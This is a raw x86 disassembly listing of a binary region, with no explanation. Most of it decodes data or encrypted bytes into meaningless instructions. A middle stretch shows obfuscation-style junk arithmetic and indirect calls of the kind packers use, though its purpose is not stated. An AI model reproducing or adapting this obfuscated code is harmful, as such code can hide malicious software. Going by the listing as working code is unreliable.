  404c33:	scas   eax,DWORD PTR es:[edi]
  404c34:	gs bswap ebx
  404c37:	mov    ebx,0x39dbcaff
  404c3c:	inc    ebp
  404c3d:	jle    0x404bfe
  404c3f:	sbb    esp,edx
  404c41:	in     eax,0xca
  404c43:	stos   DWORD PTR es:[edi],eax
  404c44:	lds    edi,FWORD PTR [ebx+0x59]
  404c47:	sbb    eax,0x13c887e7
  404c4c:	mov    ?,WORD PTR [ecx+0x46]
  404c4f:	mov    BYTE PTR [eax],al
  404c51:	lds    ebx,FWORD PTR [ecx]
  404c53:	or     al,0x97
  404c55:	push   edx
  404c56:	in     al,0xde
  404c58:	or     DWORD PTR [esi-0x22],ebp
  404c5b:	test   BYTE PTR [edx-0x3e],dl
  404c5e:	std    
  404c5f:	xchg   edx,eax
  404c60:	jmp    0x404c2c
  404c62:	retf   0x4a5e
  404c65:	mov    al,0x8c
  404c67:	cwde   
  404c68:	cmp    eax,0xde5db750
  404c6d:	dec    ebp
  404c6e:	jmp    0x404c40
  404c70:	scas   eax,DWORD PTR es:[edi]
  404c71:	inc    esp
  404c72:	sbb    DWORD PTR [edi],ecx
  404c74:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  404c76:	iret   
  404c77:	xor    ebx,DWORD PTR [ecx]
  404c79:	in     al,0x3d
  404c7b:	hlt    
  404c7c:	cmp    al,BYTE PTR [ebx-0x43]
  404c7f:	lods   eax,DWORD PTR ds:[esi]
  404c80:	stos   BYTE PTR es:[edi],al
  404c81:	cmp    eax,0xc51a8319
  404c86:	pop    ecx
  404c87:	sub    cl,BYTE PTR [ecx-0x77]
  404c8a:	dec    edi
  404c8b:	(bad)  
  404c8c:	push   esi
  404c8d:	cmp    BYTE PTR [edi],0x67
  404c90:	fwait
  404c91:	fwait
  404c92:	mov    edi,0x7f3bff90
  404c97:	and    al,0x6
  404c99:	lods   eax,DWORD PTR ds:[esi]
  404c9a:	jbe    0x404cfa
  404c9c:	push   ebx
  404c9d:	adc    al,0x58
  404c9f:	ror    DWORD PTR [ebx-0x5c53a971],1
  404ca5:	pop    ss
  404ca6:	xchg   edx,eax
  404ca7:	in     eax,dx
  404ca8:	sbb    ecx,esp
  404caa:	cmp    ebx,DWORD PTR [edi]
  404cac:	fcom   QWORD PTR [ecx-0x523a71f]
  404cb2:	cmp    ecx,eax
  404cb4:	inc    eax
  404cb5:	inc    ebx
  404cb6:	ins    DWORD PTR es:[edi],dx
  404cb7:	std    
  404cb8:	xchg   esi,eax
  404cb9:	push   ds
  404cba:	mov    ch,0x7a
  404cbc:	sbb    al,0x15
  404cbe:	in     eax,dx
  404cbf:	in     al,dx
  404cc0:	mov    dh,0x98
  404cc2:	dec    ebp
  404cc3:	xchg   ebp,eax
  404cc4:	retf   
  404cc5:	adc    DWORD PTR [eax-0x13],edx
  404cc8:	jb     0x404d11
  404cca:	fadd   QWORD PTR [edi+0x443fd692]
  404cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cd1:	pop    esp
  404cd2:	adc    edx,edx
  404cd4:	add    DWORD PTR [ecx],ebx
  404cd6:	sar    BYTE PTR [ebx-0x71],0xee
  404cda:	fs stc 
  404cdc:	nop
  404cdd:	into   
  404cde:	sub    dl,dl
  404ce0:	xor    al,0x71
  404ce2:	mov    ebp,esi
  404ce4:	sub    dl,0xae
  404ce7:	mov    ebp,0x62038ed0
  404cec:	push   es
  404ced:	mov    ecx,0x57624479
  404cf2:	fsub   QWORD PTR [ebp+0x332da50d]
  404cf8:	enter  0x3e8c,0x44
  404cfc:	sbb    eax,0x7218ecf5
  404d01:	mov    dh,0x96
  404d03:	ja     0x404d83
  404d05:	pop    ebx
  404d06:	jmp    0x404d59
  404d08:	ins    BYTE PTR es:[edi],dx
  404d09:	push   cs
  404d0a:	push   cs
  404d0b:	shl    DWORD PTR ds:0x714b485,1
  404d11:	xor    ch,BYTE PTR [edi+0x13b43bbc]
  404d17:	push   0xfdb67426
  404d1c:	push   ds
  404d1d:	push   ebx
  404d1e:	and    al,0xa4
  404d20:	xchg   ecx,eax
  404d21:	sti    
  404d22:	and    ch,cl
  404d24:	jp     0x404ccf
  404d26:	xchg   BYTE PTR [ebx],ah
  404d28:	or     BYTE PTR [eax+edx*1-0x51190a26],cl
  404d2f:	cwde   
  404d30:	popw   ds
  404d32:	push   edx
  404d33:	lock pop eax
  404d35:	mov    bl,0xe8
  404d37:	addr16 adc bh,bl
  404d3a:	iret   
  404d3b:	adc    eax,0x992f0fa9
  404d40:	repnz pop esi
  404d42:	mov    DWORD PTR [ebp-0x7d],esp
  404d45:	into   
  404d46:	je     0x404dbd
  404d48:	shl    DWORD PTR [eax-0x72],1
  404d4b:	(bad)  
  404d4c:	loope  0x404d36
  404d4e:	jno    0x404dcc
  404d50:	mov    eax,0x64fd7edb
  404d55:	hlt    
  404d56:	ret    0x2c93
  404d59:	xchg   BYTE PTR [eax-0x1baf2b78],ah
  404d5f:	imul   edi,DWORD PTR [ebx+0x6d],0xfffffff0
  404d63:	dec    esp
  404d64:	(bad)  
  404d65:	out    dx,eax
  404d66:	shl    DWORD PTR [ebx-0x3dbed097],0xb2
  404d6d:	mov    ah,0xf9
  404d6f:	(bad)  
  404d70:	ficomp WORD PTR [ecx-0x79820041]
  404d76:	mov    al,0x4
  404d78:	mov    edi,0xfd2063e5
  404d7d:	xchg   BYTE PTR [edx],cl
  404d7f:	pushf  
  404d80:	(bad)  
  404d81:	dec    esp
  404d82:	and    DWORD PTR [eax-0x3aceea69],esp
  404d88:	leave  
  404d89:	add    DWORD PTR [esi],ebp
  404d8b:	sbb    DWORD PTR [ebx-0x483655db],eax
  404d91:	das    
  404d92:	sahf   
  404d93:	sbb    DWORD PTR [ebp-0x34b10a54],ebp
  404d99:	test   DWORD PTR [ecx],ebp
  404d9b:	pop    esp
  404d9c:	xchg   ebx,eax
  404d9d:	and    dh,cl
  404d9f:	mov    ebp,0x8720d524
  404da4:	and    al,0xb7
  404da6:	pop    ds
  404da7:	ins    BYTE PTR es:[edi],dx
  404da8:	ror    esp,1
  404daa:	pop    es
  404dab:	(bad)  
  404dac:	mov    dh,0x35
  404dae:	outs   dx,DWORD PTR ds:[esi]
  404db0:	jbe    0x404dd6
  404db2:	es pushf 
  404db4:	ds pop ss
  404db6:	xchg   edi,eax
  404db7:	inc    edi
  404db8:	pop    ds
  404db9:	and    eax,0x58056cf1
  404dbe:	cdq    
  404dbf:	inc    esi
  404dc0:	leave  
  404dc1:	stos   BYTE PTR es:[edi],al
  404dc2:	and    al,0x8f
  404dc4:	and    DWORD PTR [eax+edi*1+0x70],ebp
  404dc8:	jmp    0x4a5a:0xfc4650b6
  404dcf:	lahf   
  404dd0:	add    al,0x2a
  404dd2:	bound  ebp,QWORD PTR [edx+0x26]
  404dd5:	lds    eax,FWORD PTR [ebx+0x29f51e6e]
  404ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ddc:	pop    ds
  404ddd:	adc    eax,DWORD PTR [edi]
  404ddf:	out    0x9e,al
  404de1:	in     al,dx
  404de2:	xor    BYTE PTR [ecx],bh
  404de4:	hlt    
  404de5:	mov    al,0x38
  404de7:	pop    ecx
  404de8:	xchg   esi,eax
  404de9:	stos   DWORD PTR es:[edi],eax
  404dea:	dec    ebp
  404deb:	std    
  404dec:	in     eax,0x34
  404dee:	dec    esp
  404def:	mov    ds:0xbce02da2,eax
  404df4:	loope  0x404de8
  404df6:	ret    
  404df7:	cmp    BYTE PTR [ebx+0x7a],bl
  404dfa:	(bad)  
  404dfb:	lds    ebx,FWORD PTR [eax+0x2a]
  404dfe:	mov    eax,0x5473b7fb
  404e03:	push   ebp
  404e04:	sub    al,0x16
  404e06:	mov    ebp,0x9b0f3d80
  404e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0c:	pop    ebx
  404e0d:	neg    dl
  404e0f:	sbb    ecx,esp
  404e11:	scas   eax,DWORD PTR es:[edi]
  404e12:	xchg   esi,eax
  404e13:	in     eax,0xd3
  404e15:	xlat   BYTE PTR ds:[ebx]
  404e16:	div    BYTE PTR [ebx-0x6873423b]
  404e1c:	or     BYTE PTR [esi+0x1fa3396e],dl
  404e22:	in     al,0x3b
  404e24:	xchg   DWORD PTR [esi+0x7a8877a],ebp
  404e2a:	jo     0x404e3a
  404e2c:	pop    ecx
  404e2d:	mov    ds:0x222b1e09,al
  404e32:	jnp    0x404e8f
  404e34:	fadd   st(6),st
  404e36:	push   esi
  404e37:	xchg   BYTE PTR [edx+0x14],al
  404e3a:	cmp    DWORD PTR [edi-0x44e19324],0x76
  404e41:	jae    0x404de0
  404e43:	xchg   edi,eax
  404e44:	in     al,dx
  404e45:	test   eax,0x83562d1a
  404e4a:	fmulp  st(6),st
  404e4c:	and    DWORD PTR [edi],edi
  404e4e:	sbb    ah,cl
  404e50:	mov    dl,0x94
  404e52:	pop    esi
  404e53:	stos   DWORD PTR es:[edi],eax
  404e54:	jmpw   0x756b
  404e58:	out    dx,eax
  404e59:	mov    ds:0x11a63f97,eax
  404e5e:	(bad)  
  404e5f:	xor    ebp,DWORD PTR fs:[esi]
  404e62:	mov    ebp,?
  404e64:	mov    edx,0x4616c760
  404e69:	pop    ebp
  404e6a:	mov    bh,0x8
  404e6c:	in     eax,0x24
  404e6e:	jmp    0x404e20
  404e70:	sub    edi,DWORD PTR [eax+0x5b]
  404e73:	sbb    DWORD PTR [edx+eax*8+0x5e],edx
  404e77:	ja     0x404e2a
  404e79:	(bad)  
  404e7a:	push   ds
  404e7b:	popf   
  404e7c:	loope  0x404e55
  404e7e:	cld    
  404e7f:	neg    DWORD PTR [esi+0x67]
  404e82:	int3   
  404e83:	xor    bh,BYTE PTR [edi+0x4209adf5]
  404e89:	cmc    
  404e8a:	inc    esi
  404e8b:	push   0xa4784717
  404e90:	mov    bl,0x2d
  404e92:	push   edx
  404e93:	aaa    
  404e94:	cmp    BYTE PTR [esi+0x74],dl
  404e97:	aaa    
  404e98:	(bad)  
  404e9a:	mov    ebx,0xb8d3ad6f
  404e9f:	clc    
  404ea0:	xor    al,0x4
  404ea2:	dec    ecx
  404ea3:	xor    DWORD PTR [esi],ecx
  404ea5:	push   edx
  404ea6:	rcl    BYTE PTR [eax+0x3603561f],0x97
  404ead:	pushf  
  404eae:	push   eax
  404eaf:	push   ss
  404eb0:	outs   dx,BYTE PTR ds:[esi]
  404eb1:	sti    
  404eb2:	xor    ebx,0x74
  404eb5:	cdq    
  404eb6:	loopne 0x404e42
  404eb8:	cmp    DWORD PTR [ebx-0x60e9e16c],edx
  404ebe:	mov    DWORD PTR [ecx],ebp
  404ec0:	dec    ebx
  404ec1:	clc    
  404ec2:	or     al,0x78
  404ec4:	jecxz  0x404eee
  404ec6:	inc    edx
  404ec7:	sub    al,bh
  404ec9:	and    ebp,DWORD PTR [ecx+eax*1+0x356bce49]
  404ed0:	push   ds
  404ed1:	xchg   edi,eax
  404ed2:	call   0x2a2b:0x262f3f6d
  404ed9:	pusha  
  404eda:	aam    0x97
  404edc:	aad    0x37
  404ede:	mov    eax,es
  404ee0:	push   0x52
  404ee2:	mov    eax,ds:0xd9909464
  404ee7:	repnz pop esp
  404ee9:	popf   
  404eea:	jns    0x404e92
  404eec:	jo     0x404ea9
  404eee:	hlt    
  404eef:	jo     0x404f6b
  404ef1:	inc    esp
  404ef2:	rcl    DWORD PTR [esi+ebx*2-0x7198d285],cl
  404ef9:	pop    ebx
  404efa:	mov    esp,0xacb8295d
  404eff:	mov    ch,0xf0
  404f01:	(bad)  
  404f02:	and    BYTE PTR [edi+0x78],al
  404f05:	push   esi
  404f06:	ss (bad) 
  404f08:	mov    dh,0x6e
  404f0a:	jo     0x404ebb
  404f0c:	lds    edi,FWORD PTR [ecx]
  404f0e:	data16 jb 0x404f18
  404f11:	rcr    BYTE PTR [edi+0x5db1187b],0xa5
  404f18:	(bad)  
  404f1a:	stos   BYTE PTR es:[edi],al
  404f1b:	mov    esi,0x39b93492
  404f20:	ret    0x1f4b
  404f23:	stc    
  404f24:	mov    al,ds:0xd6b984bd
  404f29:	fisubr WORD PTR [edx-0x1baaf439]
  404f2f:	sbb    DWORD PTR ds:0x42828b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428297
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x4283ab,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428387,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428393,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428393,0x0
  404f72:	mov    DWORD PTR ds:0x428323,ebx
  404f78:	mov    DWORD PTR ds:0x42839b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42827b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42824f,ebx
  404f97:	mov    DWORD PTR ds:0x428287,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428393,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d9c
  404fbc:	and    edx,DWORD PTR ds:0x428333
  404fc2:	sub    DWORD PTR ds:0x42825f,ecx
  404fc8:	or     DWORD PTR ds:0x428253,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42818f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428373
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42817b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428173
  404ff2:	xor    DWORD PTR ds:0x4282b3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428287
  404ffe:	add    DWORD PTR ds:0x4283ab,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282b3
  40500c:	add    DWORD PTR ds:0x42828b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428393,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42839f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428187,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x4283af,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42829f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428193,0x428277
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42838b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42839b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42828b,0x428397
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428283,0x4282a3
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428257,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42838b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42839b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x4283a7,0x42824b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428273,0x42825f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x4282af,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42828f,0x42826b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428177,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42839b,0x0
  40512f:	mov    DWORD PTR ds:0x4281ab,edx
  405135:	mov    DWORD PTR ds:0x42837b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42818b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42839b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427fbc
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428dc4
  40516c:	or     DWORD PTR ds:0x428283,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283b7
  40517c:	adc    ecx,DWORD PTR ds:0x42819b
  405182:	xor    DWORD PTR ds:0x42818b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42829f,edx
  405192:	cmp    DWORD PTR ds:0x4282fb,0x0
  405199:	mov    DWORD PTR ds:0x428327,0x66a6
  4051a3:	mov    DWORD PTR ds:0x428307,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282fb,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428dc8
  4051d1:	inc    DWORD PTR ds:0x428297
  4051d7:	mov    ecx,DWORD PTR ds:0x4281d7
  4051dd:	mov    edx,DWORD PTR ds:0x4283d7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282fb,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281cf
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428283,edx
  405201:	mov    edx,DWORD PTR ds:0x4281e7
  405207:	mov    ecx,DWORD PTR ds:0x4283d7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42838f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42829f
  405233:	sub    DWORD PTR ds:0x4281a3,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42837b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428187,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42828f,0x428193
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x4283ab,0x428277
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x4283a3,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42817b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282b3,0x0
  40529a:	mov    DWORD PTR ds:0x428243,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428283
  4052aa:	mov    DWORD PTR ds:0x42830b,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283b3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42829b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282b3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428079
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dcc
  4052ea:	add    edx,DWORD PTR ds:0x42826b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428193
  4052fc:	and    DWORD PTR ds:0x42819f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428277
  40530f:	add    DWORD PTR ds:0x4282b3,edx
  405315:	mov    edx,DWORD PTR ds:0x42829b
  40531b:	add    DWORD PTR ds:0x428183,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x428307,0x42823f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428323,0x0
  40533c:	mov    DWORD PTR ds:0x42831f,edi
  405342:	mov    DWORD PTR ds:0x428287,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42832b,0x4d36
  405357:	mov    DWORD PTR ds:0x4283a7,0x1e95
  405361:	cmp    DWORD PTR ds:0x428323,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428dd0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x4283af,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283ef
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42838f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42825f
  40539c:	xor    DWORD PTR ds:0x42816b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42828b,edx
  4053ae:	cmp    DWORD PTR ds:0x42830b,0x0
  4053b5:	mov    DWORD PTR ds:0x428177,edi
  4053bb:	not    DWORD PTR ds:0x42824b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x4281a7,0xab0
  4053d0:	cmp    DWORD PTR ds:0x42830b,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428dd4
  4053f6:	sub    ecx,DWORD PTR ds:0x4281ab
  4053fc:	sub    DWORD PTR ds:0x42824b,0x6432
  405406:	or     DWORD PTR ds:0x42826f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42819f
  405416:	sub    DWORD PTR ds:0x4283a3,edi
  40541c:	mov    DWORD PTR ds:0x42824b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428287,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282ff,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x4283af
  405450:	sub    edx,DWORD PTR ds:0x428163
  405456:	mov    DWORD PTR ds:0x4283af,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	test   DWORD PTR [ebp-0x461995fc],ebp
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [edi],cl
  40547a:	mov    edi,DWORD PTR [ebp+0x18b9c728]
  405480:	loope  0x405459
  405482:	dec    esp
  405483:	mov    bh,0x74
  405485:	addr16 xchg esp,eax
  405487:	push   esi
  405488:	test   al,0x42
  40548a:	mov    ecx,ebp
  40548c:	push   ebx
  40548d:	test   DWORD PTR [ecx+0x1e],ecx
  405490:	jl     0x405459
  405492:	test   BYTE PTR [ebp-0x64],ah
  405495:	(bad)  
  405497:	pop    ebx
  405498:	shl    BYTE PTR [ebx-0x6ebbf0e],0x2
  40549f:	in     al,dx
  4054a0:	xchg   ecx,eax
  4054a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054a2:	aam    0x4b
  4054a4:	mov    ebx,0xa0fb0228
  4054a9:	call   0x7c209b2
  4054ae:	out    0x26,al
  4054b0:	test   edx,ebx
  4054b2:	push   0xffffffd4
  4054b4:	mov    bh,0xe0
  4054b6:	scas   eax,DWORD PTR es:[edi]
  4054b7:	mov    eax,edx
  4054b9:	fwait
  4054ba:	dec    esi
  4054bb:	lahf   
  4054bc:	cmp    BYTE PTR [ebp+0x7704cfe9],ch
  4054c2:	jg     0x4054ff
  4054c4:	push   ecx
  4054c5:	(bad)  
  4054c7:	popa   
  4054c8:	outs   dx,DWORD PTR ds:[esi]
  4054c9:	rcl    edx,0xad
  4054cc:	jl     0x405464
  4054ce:	xchg   edx,eax
  4054cf:	aam    0x12
  4054d1:	loopne 0x405544
  4054d3:	(bad)  
  4054d5:	or     eax,0x39427182
  4054da:	call   DWORD PTR [edi+0x76]
  4054dd:	mov    bl,0x4f
  4054df:	pop    ebp
  4054e0:	imul   BYTE PTR [ebx-0x80]
  4054e3:	sahf   
  4054e4:	sub    al,0xed
  4054e6:	xor    BYTE PTR [ecx+0x7adf7d9],dl
  4054ec:	xstore-rng (bad)
  4054ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ee:	inc    ebx
  4054ef:	inc    esp
  4054f0:	xor    BYTE PTR [ebx-0x8],bl
  4054f3:	mul    dh
  4054f5:	push   eax
  4054f6:	gs jg  0x40551a
  4054f9:	or     eax,0xb2972903
  4054fe:	push   0x1c9a9355
  405503:	xor    esp,ecx
  405505:	sub    BYTE PTR [esp+eax*1],al
  405508:	mov    ebp,DWORD PTR [edx-0x4e]
  40550b:	and    al,0xd9
  40550d:	sbb    eax,0xfe3a4d30
  405512:	xlat   BYTE PTR ds:[ebx]
  405513:	xor    BYTE PTR [edx+eax*1],ah
  405516:	scas   al,BYTE PTR es:[edi]
  405517:	xchg   esp,eax
  405518:	call   FWORD PTR [ebx+esi*1-0x6]
  40551c:	inc    eax
  40551d:	and    BYTE PTR [ebp+0x12],cl
  405520:	xor    DWORD PTR [eax+0x10284bc9],edi
  405526:	sti    
  405527:	inc    esi
  405528:	adc    edx,ecx
  40552a:	mov    esp,0xc7b10beb
  40552f:	push   cs
  405530:	rol    cl,cl
  405532:	fistp  DWORD PTR [edi+eiz*1+0x4c7d3b55]
  405539:	or     DWORD PTR [ebp+0x6c733127],esp
  40553f:	sub    eax,0xe4c772d5
  405544:	retf   
  405545:	jp     0x405546
  405547:	jo     0x4055c2
  405549:	aam    0x7a
  40554b:	int    0x4d
  40554d:	add    ah,BYTE PTR [edx]
  40554f:	cmp    BYTE PTR [bx+0x41],bh
  405553:	ins    BYTE PTR es:[edi],dx
  405554:	xchg   esp,eax
  405555:	test   al,0x1b
  405557:	sub    al,0x10
  405559:	dec    bl
  40555b:	and    ah,cl
  40555d:	fld    st(5)
  40555f:	loope  0x405563
  405561:	(bad)  
  405562:	pop    edi
  405563:	inc    ebx
  405564:	push   ecx
  405565:	cmp    al,0x3
  405567:	ror    BYTE PTR ds:0xe543affe,1
  40556d:	mov    edx,0x53e5846f
  405572:	inc    edi
  405573:	xchg   edi,eax
  405574:	inc    ecx
  405575:	gs mov ecx,0xf03e2de1
  40557b:	(bad)  
  40557c:	jle    0x405532
  40557e:	das    
  40557f:	pop    esp
  405580:	test   DWORD PTR [esi],esi
  405582:	xor    eax,0x1b6d8d1
  405587:	pop    esp
  405588:	aad    0x93
  40558a:	idiv   DWORD PTR [ebx+0x71]
  40558d:	cli    
  40558e:	clc    
  40558f:	jae    0x405563
  405591:	ret    0xcf1e
  405594:	mov    edx,0xf9571b6d
  405599:	xchg   edi,eax
  40559a:	(bad)  
  40559b:	popf   
  40559c:	and    al,0x3
  40559e:	jo     0x40552d
  4055a0:	mov    ah,0x61
  4055a2:	test   DWORD PTR [eax+0x43],edi
  4055a5:	mov    ah,0x4a
  4055a7:	rol    DWORD PTR [ebp-0x1a],1
  4055aa:	(bad)  
  4055ab:	out    dx,al
  4055ac:	out    dx,al
  4055ad:	mov    cl,0xc6
  4055af:	fwait
  4055b0:	(bad)  
  4055b1:	loope  0x4055b6
  4055b3:	xchg   ebx,eax
  4055b4:	xchg   esp,eax
  4055b5:	(bad)  [esi-0x435ed80f]
  4055bb:	jmp    0xee590288
  4055c0:	mov    esp,0x9dbf0332
  4055c5:	fnstenv [esp+ebp*2+0xe]
  4055c9:	sub    eax,0xd7acc5e7
  4055ce:	push   es
